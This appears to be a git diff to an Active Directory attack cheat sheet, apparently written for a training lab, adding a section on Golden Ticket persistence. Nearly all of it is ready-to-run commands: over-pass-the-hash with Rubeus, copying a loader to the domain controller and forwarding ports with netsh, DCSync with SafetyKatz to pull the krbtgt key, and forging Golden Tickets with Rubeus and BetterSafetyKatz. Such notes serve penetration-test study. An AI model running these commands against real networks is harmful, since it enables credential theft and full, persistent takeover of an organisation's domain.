@@ -166,5 +166,39 @@ PS> Invoke-Mimi -Command '"sekurlsa::ekeys"'
 PS> Invoke-Mimi -Command '"token::elevate" "vault::cred /patch"'
 
 # Over-Pass-The-Hash
-PS> C:\AD\Tools\Rubeus.exe asktgt /user:svcadmin /aes256:<AES256KEY> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+PS> C:\AD\Tools\Rubeus.exe asktgt /user:svcadmin /aes256:<aes256key> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+```
+
+# Persistence - Golden Ticket
+```powershell
+# To perform a Golden Ticket attack. You can use Mimikatz or DCSync to extract the AES key for krbtgt account.
+
+Generate a Golden Ticket using Rubeus
+#1- Start a process with Domain Admin Privileges
+PS> C:\AD\Tools\Rubeus.exe asktgt /user:svcadmin /aes256:<aes256key> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+
+#2- Copy Loader to the DC & Start Port forwarding
+PS> echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-dc\C$\Users\Public\Loader.exe /Y 
+PS> winrs -r:dcorp-dc cmd
+PS> netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.x
+
+#3- Run SafetyKatz to extract aes256key for krbtgt
+PS> C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
+
+#4- Use Rubeus to generate a Golden Ticket. This will create a command to forage a Golden Ticket
+PS> C:\AD\Tools\Rubeus.exe golden /aes256:<aes256key> /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /printcmd
+PS> C:\AD\Tools\Rubeus.exe golden /aes256:<aes256key> /user:Administrator /id:500 /pgid:513 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /pwdlastset:"11/11/2022 6:34:22 
+AM" /minpassage:1 /logoncount:35 /netbios:dcorp /groups:544,512,520,513 /dc:DCORP-DC.dollarcorp.moneycorp.local 
+/uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD /ptt
+C:\AD\Tools> winrs -r:dcorp-dc cmd
+C:\AD\Tools> set username; set computername
+
+Generate a Golden Ticket using BetterSafetyKatz
+#1- Use the below to create a golden ticket
+C:\Windows\system32>  C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21
+719815819-3726368948-3917688648 /aes256:<aes256key> /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
+
+#2- list all tickets
+C:\Windows\system32> klist
+C:\Windows\system32> dir \\dcorp-dc\C$
 ```
